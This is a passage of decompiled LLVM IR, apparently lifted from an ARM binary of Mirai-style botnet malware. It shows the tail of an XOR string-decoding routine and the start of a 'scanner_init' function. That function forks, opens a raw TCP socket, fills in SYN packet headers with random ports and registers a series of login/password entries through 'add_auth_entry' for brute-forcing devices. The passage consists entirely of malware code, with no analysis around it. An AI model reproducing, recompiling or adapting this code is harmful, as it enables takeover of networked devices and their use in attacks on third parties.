  %v2_ebec = phi i32 [ %v1_ebf0, %dec_label_pc_ebe4 ], [ 0, %dec_label_pc_ebe0 ]
  %v1_ebe4 = load i32, i32* %r6.global-to-local, align 4
  %v2_ebe4 = add i32 %v1_ebe4, %v2_ebec
  %v3_ebe4 = inttoptr i32 %v2_ebe4 to i8*
  %v4_ebe4 = load i8, i8* %v3_ebe4, align 1
  %v6_ebe4 = zext i8 %v4_ebe4 to i32
  %v1_ebe8 = xor i32 %v6_ebe4, 84
  store i32 %v1_ebe8, i32* %r3.global-to-local, align 4
  %v1_ebec = trunc i32 %v1_ebe8 to i8
  store i8 %v1_ebec, i8* %v3_ebe4, align 1
  %v0_ebf0 = load i32, i32* %r2.global-to-local, align 4
  %v1_ebf0 = add i32 %v0_ebf0, 1
  store i32 %v1_ebf0, i32* %r2.global-to-local, align 4
  %v1_ebf4 = load i32, i32* @r7, align 4
  %v9_ebf4 = icmp eq i32 %v1_ebf0, %v1_ebf4
  br i1 %v9_ebf4, label %dec_label_pc_ebfc.loopexit, label %dec_label_pc_ebe4

dec_label_pc_ebfc.loopexit:                       ; preds = %dec_label_pc_ebe4
  %extract.t = trunc i32 %v1_ebf0 to i8
  br label %dec_label_pc_ebfc

dec_label_pc_ebfc:                                ; preds = %dec_label_pc_ebfc.loopexit, %entry
  %v0_ec0c.off0 = phi i8 [ %extract.t, %dec_label_pc_ebfc.loopexit ], [ %extract.t6, %entry ]
  %v2_ebfc = load i32, i32* @global_var_22444.145, align 4
  %v2_ec00 = load i32, i32* @global_var_22470.147, align 4
  %v3_ec04 = mul i32 %v2_ebfc, 16
  store i32 %v3_ec04, i32* @sb, align 4
  %v2_ec08 = add i32 %v2_ec00, %v3_ec04
  store i32 %v2_ec08, i32* %r2.global-to-local, align 4
  %v3_ec0c = add i32 %v2_ec08, 12
  %v4_ec0c = inttoptr i32 %v3_ec0c to i8*
  store i8 %v0_ec0c.off0, i8* %v4_ec0c, align 1
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 %v2_eba0, i32* %r3.global-to-local, align 4
  %v0_ec18 = load i32, i32* %r6.global-to-local, align 4
  %v1_ec18 = load i32, i32* @r8, align 4
  %v5_ec18 = mul i32 %v2_eba0, 16
  %v6_ec18 = add i32 %v1_ec18, %v5_ec18
  %v7_ec18 = inttoptr i32 %v6_ec18 to i32*
  store i32 %v0_ec18, i32* %v7_ec18, align 4
  %v2_ec1c = load i32, i32* @global_var_22470.147, align 4
  store i32 %v2_ec1c, i32* @r7, align 4
  %v1_ec20 = inttoptr i32 %arg2 to i8*
  %v2_ec20 = call i32 @util_strlen(i8* %v1_ec20)
  %sext1 = mul i32 %v2_ec20, 16777216
  %v1_ec24 = sdiv i32 %sext1, 16777216
  %v2_ec24 = add nsw i32 %v1_ec24, 1
  store i32 %v2_ec24, i32* @r4, align 4
  store i32 %v1_ec24, i32* @r6, align 4
  store i32 %v2_ec24, i32* @r0, align 4
  %v0_ec30 = call i32 @malloc()
  store i32 %v0_ec30, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %v0_ec38 = load i32, i32* @r4, align 4
  store i32 %v0_ec38, i32* %r2.global-to-local, align 4
  store i32 %v0_ec30, i32* %r5.global-to-local, align 4
  %v3_ec40 = call i32 @util_memcpy(i32 %v0_ec30, i32 %arg2, i32 %v0_ec38)
  store i32 %v3_ec40, i32* %r0.global-to-local, align 4
  %v0_ec44 = load i32, i32* @r6, align 4
  %tmp23 = icmp slt i32 %v0_ec44, 1
  %extract.t8 = trunc i32 %v0_ec44 to i8
  br i1 %tmp23, label %dec_label_pc_ec68, label %dec_label_pc_ec4c

dec_label_pc_ec4c:                                ; preds = %dec_label_pc_ebfc
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_ec50

dec_label_pc_ec50:                                ; preds = %dec_label_pc_ec50, %dec_label_pc_ec4c
  %v2_ec58 = phi i32 [ %v1_ec5c, %dec_label_pc_ec50 ], [ 0, %dec_label_pc_ec4c ]
  %v1_ec50 = load i32, i32* %r5.global-to-local, align 4
  %v2_ec50 = add i32 %v1_ec50, %v2_ec58
  %v3_ec50 = inttoptr i32 %v2_ec50 to i8*
  %v4_ec50 = load i8, i8* %v3_ec50, align 1
  %v6_ec50 = zext i8 %v4_ec50 to i32
  %v1_ec54 = xor i32 %v6_ec50, 84
  store i32 %v1_ec54, i32* %r3.global-to-local, align 4
  %v1_ec58 = trunc i32 %v1_ec54 to i8
  store i8 %v1_ec58, i8* %v3_ec50, align 1
  %v0_ec5c = load i32, i32* %r2.global-to-local, align 4
  %v1_ec5c = add i32 %v0_ec5c, 1
  store i32 %v1_ec5c, i32* %r2.global-to-local, align 4
  %v1_ec60 = load i32, i32* @r6, align 4
  %v9_ec60 = icmp eq i32 %v1_ec5c, %v1_ec60
  br i1 %v9_ec60, label %dec_label_pc_ec68.loopexit, label %dec_label_pc_ec50

dec_label_pc_ec68.loopexit:                       ; preds = %dec_label_pc_ec50
  %extract.t7 = trunc i32 %v1_ec5c to i8
  br label %dec_label_pc_ec68

dec_label_pc_ec68:                                ; preds = %dec_label_pc_ec68.loopexit, %dec_label_pc_ebfc
  %v0_ec78.off0 = phi i8 [ %extract.t7, %dec_label_pc_ec68.loopexit ], [ %extract.t8, %dec_label_pc_ebfc ]
  %v2_ec68 = load i32, i32* @global_var_22444.145, align 4
  store i32 %v2_ec68, i32* %r0.global-to-local, align 4
  %v2_ec6c = load i32, i32* @global_var_22470.147, align 4
  %v3_ec70 = mul i32 %v2_ec68, 16
  store i32 %v3_ec70, i32* %r1.global-to-local, align 4
  %v2_ec74 = or i32 %v3_ec70, 13
  %v3_ec78 = add i32 %v2_ec74, %v2_ec6c
  %v4_ec78 = inttoptr i32 %v3_ec78 to i8*
  store i8 %v0_ec78.off0, i8* %v4_ec78, align 1
  store i32 ptrtoint (i16** @global_var_22474.149 to i32), i32* %r4.global-to-local, align 4
  %v2_ec84 = load i16, i16* bitcast (i16** @global_var_22474.149 to i16*), align 4
  %v3_ec84 = zext i16 %v2_ec84 to i32
  store i32 %v3_ec84, i32* %lr.global-to-local, align 4
  %v2_ec8c = load i32, i32* @global_var_22470.147, align 4
  store i32 %v2_ec8c, i32* %r2.global-to-local, align 4
  %v0_ec94 = load i32, i32* %r1.global-to-local, align 4
  %v2_ec94 = add i32 %v0_ec94, %v2_ec8c
  store i32 %v2_ec94, i32* %r1.global-to-local, align 4
  store i32 lshr (i32 shl (i32 ptrtoint (i16** @global_var_22474.149 to i32), i32 16), i32 16), i32* %r3.global-to-local, align 4
  %v0_ec9c = load i32, i32* @sb, align 4
  %v1_ec9c = load i32, i32* @r7, align 4
  %v2_ec9c = add i32 %v1_ec9c, %v0_ec9c
  store i32 %v2_ec9c, i32* %ip.global-to-local, align 4
  %v0_eca0 = load i32, i32* %r0.global-to-local, align 4
  %v1_eca0 = add i32 %v0_eca0, 1
  store i32 %v1_eca0, i32* %r0.global-to-local, align 4
  %v3_eca4 = add i32 %v2_ec94, 10
  %v4_eca4 = inttoptr i32 %v3_eca4 to i16*
  store i16 trunc (i32 lshr (i32 shl (i32 ptrtoint (i16** @global_var_22474.149 to i32), i32 16), i32 16) to i16), i16* %v4_eca4, align 2
  %v0_eca8 = load i32, i32* %lr.global-to-local, align 4
  %v1_eca8 = trunc i32 %v0_eca8 to i16
  %v2_eca8 = load i32, i32* %r1.global-to-local, align 4
  %v3_eca8 = add i32 %v2_eca8, 8
  %v4_eca8 = inttoptr i32 %v3_eca8 to i16*
  store i16 %v1_eca8, i16* %v4_eca8, align 2
  %v0_ecac = load i32, i32* %r5.global-to-local, align 4
  %v1_ecac = load i32, i32* %ip.global-to-local, align 4
  %v2_ecac = add i32 %v1_ecac, 4
  %v3_ecac = inttoptr i32 %v2_ecac to i32*
  store i32 %v0_ecac, i32* %v3_ecac, align 4
  %v1_ecb0 = load i32, i32* @fp, align 4
  %v2_ecb0 = inttoptr i32 %v1_ecb0 to i32*
  store i32 %v1_eca0, i32* %v2_ecb0, align 4
  %v0_ecb4 = load i32, i32* %r3.global-to-local, align 4
  %v1_ecb4 = trunc i32 %v0_ecb4 to i16
  %v2_ecb4 = load i32, i32* %r4.global-to-local, align 4
  %v3_ecb4 = inttoptr i32 %v2_ecb4 to i16*
  store i16 %v1_ecb4, i16* %v3_ecb4, align 2
  store i32 %v3_eb70, i32* @r4, align 4
  store i32 %v6_eb70, i32* @r5, align 4
  store i32 %v9_eb70, i32* @r6, align 4
  store i32 %v12_eb70, i32* @r7, align 4
  store i32 %v15_eb70, i32* @r8, align 4
  store i32 %v18_eb70, i32* @sb, align 4
  store i32 %v21_eb70, i32* @sl, align 4
  store i32 %v24_eb70, i32* @fp, align 4
  ret i32 %v1_eca0

; uselistorder directives
  uselistorder i32 %v3_ec70, { 1, 0 }
  uselistorder i32 %v1_ec5c, { 0, 2, 3, 1 }
  uselistorder i32 %v0_ec30, { 1, 0, 2 }
  uselistorder i32 %v3_ec04, { 1, 0 }
  uselistorder i32 %v1_ebf0, { 0, 2, 3, 1 }
  uselistorder i32 %v0_ebc4, { 1, 0, 2 }
  uselistorder i32 %v2_eba0, { 1, 0, 2 }
  uselistorder i32 %v3_eb94, { 1, 0 }
  uselistorder i32 %v1_eb84, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 0 }
  uselistorder i32 (i8*)* @util_strlen, { 5, 6, 0, 1, 2, 3, 4, 27, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 28 }
  uselistorder i32 %arg2, { 3, 2, 1, 0, 4 }
}

define i32 @scanner_init(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp334 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-42 = alloca i32, align 4
  %stack_var_-77 = alloca i32, align 4
  %stack_var_-45 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-352 = alloca i32, align 4
  %stack_var_-224 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %stack_var_-1866 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v6_ecd0 = load i32, i32* @r5, align 4
  %v18_ecd0 = load i32, i32* @sb, align 4
  %v21_ecd0 = load i32, i32* @sl, align 4
  %v24_ecd0 = load i32, i32* @fp, align 4
  %v0_ecdc = call i32 @__libc_fork()
  %v7_ece0 = icmp eq i32 %v0_ecdc, -1
  %. = zext i1 %v7_ece0 to i32
  %tmp369 = icmp slt i32 %v0_ecdc, 1
  %storemerge328 = select i1 %tmp369, i32 %., i32 1
  store i32 %storemerge328, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_24f64.141 to i32), i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ecfc = icmp eq i32 %storemerge328, 0
  store i1 %v2_ecfc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_ecdc, i32* @global_var_24f64.141, align 4
  br i1 %v2_ecfc, label %dec_label_pc_ed18, label %dec_label_pc_ed08

dec_label_pc_ed08:                                ; preds = %entry
  store i32 %v6_ecd0, i32* @r5, align 4
  store i32 %v18_ecd0, i32* @sb, align 4
  store i32 %v21_ecd0, i32* @sl, align 4
  store i32 %v24_ecd0, i32* @fp, align 4
  ret i32 %v0_ecdc

dec_label_pc_ed18:                                ; preds = %entry
  %v0_ed18 = call i32 @util_local_addr()
  store i32 ptrtoint (i32* @global_var_24f40.59 to i32), i32* %r1.global-to-local, align 4
  store i32 %v0_ed18, i32* @global_var_24f40.59, align 4
  %v1_ed24 = call i32 @rand_init(i32 %v0_ed18)
  %v0_ed28 = load i32, i32* @r4, align 4
  %v1_ed2c = inttoptr i32 %v0_ed28 to i32*
  %v2_ed2c = call i32 @__GI_time(i32* %v1_ed2c)
  store i32 ptrtoint (i32* @global_var_22478.143 to i32), i32* %r2.global-to-local, align 4
  store i32 388, i32* %r1.global-to-local, align 4
  store i32 %v2_ed2c, i32* @global_var_22478.143, align 4
  %v2_ed40 = call i32 @calloc(i32 356, i32 388)
  store i32 ptrtoint (i32* @global_var_24f5c.154 to i32), i32* %r3.global-to-local, align 4
  %v0_ed48 = load i32, i32* @r4, align 4
  store i32 %v0_ed48, i32* %stack_var_-52, align 4
  store i32 %v2_ed40, i32* @global_var_24f5c.154, align 4
  store i32 %v0_ed48, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_ed54

dec_label_pc_ed54:                                ; preds = %dec_label_pc_ed54.dec_label_pc_ed54_crit_edge, %dec_label_pc_ed18
  %v2_ed70 = phi i32 [ %v2_ed70.pre, %dec_label_pc_ed54.dec_label_pc_ed54_crit_edge ], [ %v2_ed40, %dec_label_pc_ed18 ]
  %v0_ed58 = phi i32 [ %v0_eda0, %dec_label_pc_ed54.dec_label_pc_ed54_crit_edge ], [ %v0_ed48, %dec_label_pc_ed18 ]
  %v1_ed78 = add i32 %v0_ed58, 1
  store i32 %v1_ed78, i32* %ip.global-to-local, align 4
  %v3_ed7c = mul i32 %v0_ed58, 388
  %v2_ed84 = add i32 %v3_ed7c, %v2_ed70
  store i32 %v2_ed84, i32* @r3, align 4
  store i32 %v2_ed84, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_ed98 = add i32 %v2_ed84, 4
  %v3_ed98 = inttoptr i32 %v2_ed98 to i32*
  store i32 -1, i32* %v3_ed98, align 4
  %v0_ed9c = load i32, i32* @r5, align 4
  %v1_ed9c = load i32, i32* %r1.global-to-local, align 4
  %v2_ed9c = add i32 %v1_ed9c, 12
  %v3_ed9c = inttoptr i32 %v2_ed9c to i32*
  store i32 %v0_ed9c, i32* %v3_ed9c, align 4
  %v0_eda0 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v0_eda0, i32* %stack_var_-52, align 4
  %v5_eda4 = icmp slt i32 %v1_ed78, 356
  br i1 %v5_eda4, label %dec_label_pc_ed54.dec_label_pc_ed54_crit_edge, label %dec_label_pc_eda8

dec_label_pc_ed54.dec_label_pc_ed54_crit_edge:    ; preds = %dec_label_pc_ed54
  %v2_ed70.pre = load i32, i32* @global_var_24f5c.154, align 4
  br label %dec_label_pc_ed54

dec_label_pc_eda8:                                ; preds = %dec_label_pc_ed54
  %v8_ed94 = icmp eq i32 %v1_ed78, 356
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 %v8_ed94, i1* %cpsr_z.global-to-local, align 1
  store i32 3, i32* %r1.global-to-local, align 4
  %v0_edb0 = load i32, i32* %r2.global-to-local, align 4
  %v1_edb0 = add i32 %v0_edb0, 7
  store i32 %v1_edb0, i32* %r2.global-to-local, align 4
  %v3_edb4 = call i32 @socket(i32 2, i32 3, i32 %v1_edb0)
  store i32 ptrtoint (i32* @global_var_24f60.156 to i32), i32* @lr, align 4
  %v2_edbc = icmp eq i32 %v3_edb4, -1
  store i1 %v2_edbc, i1* %cpsr_c.global-to-local, align 1
  %v7_edbc = icmp eq i32 %v3_edb4, -1
  store i1 %v7_edbc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_edb4, i32* @r4, align 4
  store i32 %v3_edb4, i32* @global_var_24f60.156, align 4
  br i1 %v7_edbc, label %dec_label_pc_10464, label %dec_label_pc_edcc

dec_label_pc_edcc:                                ; preds = %dec_label_pc_eda8
  store i32 3, i32* %r1.global-to-local, align 4
  %v0_edd0 = load i32, i32* @r5, align 4
  store i32 %v0_edd0, i32* @r2, align 4
  %v2_edd4 = call i32 @__libc_fcntl(i32 %v3_edb4, i32 3)
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_eddc = or i32 %v2_edd4, 2048
  store i32 %v1_eddc, i32* @r2, align 4
  %v0_ede0 = load i32, i32* @r4, align 4
  %v2_ede4 = call i32 @__libc_fcntl(i32 %v0_ede0, i32 4)
  %v2_edec = ptrtoint i32* %stack_var_-56 to i32
  %v2_edf0 = load i32, i32* @global_var_24f60.156, align 4
  store i32 1, i32* %ip.global-to-local, align 4
  %v0_edf8 = load i32, i32* @r5, align 4
  store i32 %v0_edf8, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v2_ee00 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_ee00, i32* %r3.global-to-local, align 4
  store i32 4, i32* @r4, align 4
  store i32 1, i32* %stack_var_-52, align 4
  %v5_ee10 = call i32 @__GI_setsockopt(i32 %v2_edf0, i32 %v0_edf8, i32 3, i32 %v2_ee00, i32 4)
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ee14 = icmp eq i32 %v5_ee10, 0
  store i1 %v2_ee14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ee14, label %dec_label_pc_ee1c, label %dec_label_pc_10458

dec_label_pc_ee1c:                                ; preds = %dec_label_pc_edcc, %dec_label_pc_ee1c
  %v0_ee1c = call i32 @rand_next()
  %v1_ee2c = mul i32 %v0_ee1c, 256
  %v3_ee30 = and i32 %v1_ee2c, 65280
  %tmp372 = udiv i32 %v0_ee1c, 256
  %v4_ee34 = urem i32 %tmp372, 256
  %v5_ee34 = or i32 %v4_ee34, %v3_ee30
  store i32 %v5_ee34, i32* %r3.global-to-local, align 4
  %v2_ee38 = icmp ugt i32 %v5_ee34, 1023
  store i1 %v2_ee38, i1* %cpsr_c.global-to-local, align 1
  %v7_ee38 = icmp eq i32 %v5_ee34, 1024
  store i1 %v7_ee38, i1* %cpsr_z.global-to-local, align 1
  %v3_ee3c = icmp ult i32 %v5_ee34, 1022
  br i1 %v3_ee3c, label %dec_label_pc_ee1c, label %dec_label_pc_ee40

dec_label_pc_ee40:                                ; preds = %dec_label_pc_ee1c
  %v5_ee28.le = trunc i32 %v0_ee1c to i16
  store i32 ptrtoint (i8** @global_var_22448.158 to i32), i32* %ip.global-to-local, align 4
  %v2_ee44 = load i8, i8* bitcast (i8** @global_var_22448.158 to i8*), align 4
  %v3_ee44 = zext i8 %v2_ee44 to i32
  %v1_ee48 = and i32 %v3_ee44, 240
  %v1_ee4c = or i32 %v1_ee48, 5
  store i32 %v1_ee4c, i32* %r3.global-to-local, align 4
  store i32 69, i32* %r2.global-to-local, align 4
  store i8 69, i8* bitcast (i8** @global_var_22448.158 to i8*), align 4
  store i16 10240, i16* bitcast (i32* @global_var_2244a.159 to i16*), align 4
  %v0_ee6c = call i32 @rand_next()
  %v1_ee6c = trunc i32 %v0_ee6c to i16
  %v3_ee74 = load i8, i8* @global_var_22468.162, align 1
  store i32 ptrtoint (i32* @global_var_2245c.161 to i32), i32* @lr, align 4
  store i32 ptrtoint (i8** @global_var_22448.158 to i32), i32* %ip.global-to-local, align 4
  %v1_ee84 = urem i8 %v3_ee74, 16
  store i16 %v1_ee6c, i16* bitcast (i32* @global_var_2244c.163 to i16*), align 4
  %v1_ee8c = or i8 %v1_ee84, 80
  store i32 64, i32* %r3.global-to-local, align 4
  store i8 64, i8* bitcast (i32* @global_var_22450.164 to i8*), align 4
  store i8 6, i8* bitcast (i32* @global_var_22451.165 to i8*), align 4
  store i8 %v1_ee8c, i8* @global_var_22468.162, align 1
  %v4_eea4 = sext i16 %v5_ee28.le to i32
  store i32 %v4_eea4, i32* %r2.global-to-local, align 4
  store i32 5888, i32* %r1.global-to-local, align 4
  store i16 5888, i16* @global_var_2245e.166, align 2
  store i16 %v5_ee28.le, i16* bitcast (i32* @global_var_2245c.161 to i16*), align 4
  %v0_eeb4 = call i32 @rand_next()
  %v1_eeb4 = trunc i32 %v0_eeb4 to i16
  store i32 ptrtoint (i32* @global_var_2245c.161 to i32), i32* %ip.global-to-local, align 4
  %v3_eebc = load i8, i8* @global_var_22469.167, align 1
  %v4_eebc = zext i8 %v3_eebc to i32
  %v1_eec0 = or i32 %v4_eebc, 2
  store i32 %v1_eec0, i32* %r3.global-to-local, align 4
  store i16 %v1_eeb4, i16* bitcast (i32* @global_var_2246a.168 to i16*), align 4
  %v1_eec8 = trunc i32 %v1_eec0 to i8
  store i8 %v1_eec8, i8* @global_var_22469.167, align 1
  store i32 ptrtoint (i32* @global_var_19a8c.172 to i32), i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v4_eed8 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_19a88.170 to i32), i32 ptrtoint (i32* @global_var_19a8c.172 to i32), i32 4)
  store i32 ptrtoint ([5 x i8]* @global_var_19a90.174 to i32), i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v5_eee8 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_19a88.170 to i32), i32 ptrtoint ([5 x i8]* @global_var_19a90.174 to i32), i32 8)
  store i32 ptrtoint ([9 x i8]* @global_var_19a98.176 to i32), i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  %v5_eef8 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_19a88.170 to i32), i32 ptrtoint ([9 x i8]* @global_var_19a98.176 to i32), i32 12)
  store i32 ptrtoint (i32* @global_var_19a8c.172 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v4_ef08 = call i32 @add_auth_entry(i32 ptrtoint ([8 x i8]* @global_var_19aa4.178 to i32), i32 ptrtoint (i32* @global_var_19a8c.172 to i32), i32 7)
  store i32 ptrtoint ([9 x i8]* @global_var_19aac.180 to i32), i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  %v5_ef18 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_19a88.170 to i32), i32 ptrtoint ([9 x i8]* @global_var_19aac.180 to i32), i32 12)
  store i32 10, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_19ab8.182 to i32), i32* %r1.global-to-local, align 4
  %v5_ef28 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_19ab8.182 to i32), i32 ptrtoint ([6 x i8]* @global_var_19ab8.182 to i32), i32 10)
  store i32 ptrtoint ([6 x i8]* @global_var_19ac0.184 to i32), i32* %r1.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v5_ef38 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_19a88.170 to i32), i32 ptrtoint ([6 x i8]* @global_var_19ac0.184 to i32), i32 9)
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_19ac8.186 to i32), i32* %r1.global-to-local, align 4
  %v5_ef48 = call i32 @add_auth_entry(i32 ptrtoint ([8 x i8]* @global_var_19ac8.186 to i32), i32 ptrtoint ([8 x i8]* @global_var_19ac8.186 to i32), i32 14)
  store i32 ptrtoint ([8 x i8]* @global_var_19aa4.178 to i32), i32* %r1.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  %v5_ef58 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_19a88.170 to i32), i32 ptrtoint ([8 x i8]* @global_var_19aa4.178 to i32), i32 11)
  store i32 ptrtoint (i32* @global_var_19ad0.188 to i32), i32* %r1.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  %v4_ef68 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_19a88.170 to i32), i32 ptrtoint (i32* @global_var_19ad0.188 to i32), i32 17)
  store i32 ptrtoint ([6 x i8]* @global_var_19ae0.190 to i32), i32* %r1.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v5_ef78 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_19a88.170 to i32), i32 ptrtoint ([6 x i8]* @global_var_19ae0.190 to i32), i32 9)
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_19ae8.192 to i32), i32* %r1.global-to-local, align 4
  %v5_ef88 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_19ae8.192 to i32), i32 ptrtoint ([5 x i8]* @global_var_19ae8.192 to i32), i32 8)
  store i32 ptrtoint (i32* @global_var_19af0.194 to i32), i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v4_ef98 = call i32 @add_auth_entry(i32 ptrtoint ([8 x i8]* @global_var_19aa4.178 to i32), i32 ptrtoint (i32* @global_var_19af0.194 to i32), i32 15)
  store i32 ptrtoint (i32* @global_var_19afc.196 to i32), i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v4_efa8 = call i32 @add_auth_entry(i32 ptrtoint ([8 x i8]* @global_var_19aa4.178 to i32), i32 ptrtoint (i32* @global_var_19afc.196 to i32), i32 15)
  store i32 ptrtoint ([5 x i8]* @global_var_19b08.198 to i32), i32* %r1.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v5_efb8 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_19ab8.182 to i32), i32 ptrtoint ([5 x i8]* @global_var_19b08.198 to i32), i32 9)
  %v2_efc0 = ptrtoint i32* %stack_var_-1866 to i32
  store i32 %v2_efc0, i32* @lr, align 4
  %v1_f2e8 = add i32 %v2_efc0, 20
  %v1_f348 = add i32 %v2_efc0, 16
  %v2_f348 = inttoptr i32 %v1_f348 to i32*
  %v1_f3ec = add i32 %v2_efc0, 12
  %v2_f3ec = inttoptr i32 %v1_f3ec to i32*
  %v2_f5dc = ptrtoint i32* %stack_var_-40 to i32
  %v2_f624 = ptrtoint i32* %stack_var_-68 to i32
  %v2_f628 = ptrtoint i32* %stack_var_-224 to i32
  %v2_f62c = ptrtoint i32* %stack_var_-352 to i32
  %v2_100b0 = ptrtoint i32* %stack_var_-45 to i32
  %v2_100c4 = ptrtoint i32* %stack_var_-77 to i32
  %v2_1001c = ptrtoint i32* %stack_var_-60 to i32
  %v2_f878 = ptrtoint i32* %stack_var_-104 to i32
  %v2_10354 = ptrtoint i32* %stack_var_-96 to i32
  %v2_103ac = ptrtoint i32* %stack_var_-42 to i32
  %v1_f358 = add i32 %v2_efc0, 9
  %v2_f358 = inttoptr i32 %v1_f358 to i8*
  br label %dec_label_pc_efc8

dec_label_pc_efc8:                                ; preds = %dec_label_pc_f7cc, %dec_label_pc_ee40
  %stack_var_-1880.0 = phi i32 [ %tmp334, %dec_label_pc_ee40 ], [ %stack_var_-1880.1, %dec_label_pc_f7cc ]
  store i32 ptrtoint (i32* @global_var_22478.143 to i32), i32* %r1.global-to-local, align 4
  store i32 %stack_var_-1880.0, i32* %r2.global-to-local, align 4
  %v2_efd0 = load i32, i32* @global_var_22478.143, align 4
  store i32 %v2_efd0, i32* @r4, align 4
  %v3_efd4 = icmp uge i32 %stack_var_-1880.0, %v2_efd0
  store i1 %v3_efd4, i1* %cpsr_c.global-to-local, align 1
  %v9_efd4 = icmp eq i32 %stack_var_-1880.0, %v2_efd0
  store i1 %v9_efd4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_efd4, label %dec_label_pc_f2dc, label %dec_label_pc_efdc

dec_label_pc_efdc:                                ; preds = %dec_label_pc_efc8
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-52, align 4
  store i32 %v2_10354, i32* @r5, align 4
  br label %dec_label_pc_efec

dec_label_pc_efec:                                ; preds = %bb405, %dec_label_pc_efdc
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-96, align 4
  %v0_f000 = call i32 @rand_next()
  %v1_f000 = trunc i32 %v0_f000 to i16
  store i32 ptrtoint (i32* @global_var_24f40.59 to i32), i32* %ip.global-to-local, align 4
  %v2_f00c = load i32, i32* @global_var_24f40.59, align 4
  store i32 %v2_f00c, i32* %r3.global-to-local, align 4
  store i16 %v1_f000, i16* bitcast (i32* @global_var_2244c.163 to i16*), align 4
  store i32 %v2_f00c, i32* @global_var_22454.199, align 4
  br label %dec_label_pc_f018

dec_label_pc_f018:                                ; preds = %dec_label_pc_f170, %dec_label_pc_f048, %dec_label_pc_f1a4, %dec_label_pc_f198, %dec_label_pc_f18c, %dec_label_pc_f180, %.thread47, %.thread31, %.thread27, %.thread23, %bb398, %bb397, %bb396, %bb395, %bb394, %bb393, %bb392, %bb391, %bb390, %bb389, %dec_label_pc_f0e4, %dec_label_pc_f0dc, %bb383, %dec_label_pc_f0ac, %dec_label_pc_f088, %bb376, %dec_label_pc_f058, %bb375, %dec_label_pc_f040, %bb374, %bb400, %dec_label_pc_efec
  %v0_f018 = call i32 @rand_next()
  %v1_f01c = urem i32 %v0_f018, 256
  store i32 %v1_f01c, i32* %r1.global-to-local, align 4
  %v3_f020 = udiv i32 %v0_f018, 256
  store i32 %v3_f020, i32* %r3.global-to-local, align 4
  %v3_f024 = udiv i32 %v0_f018, 65536
  store i32 %v3_f024, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f028 = icmp eq i32 %v1_f01c, 0
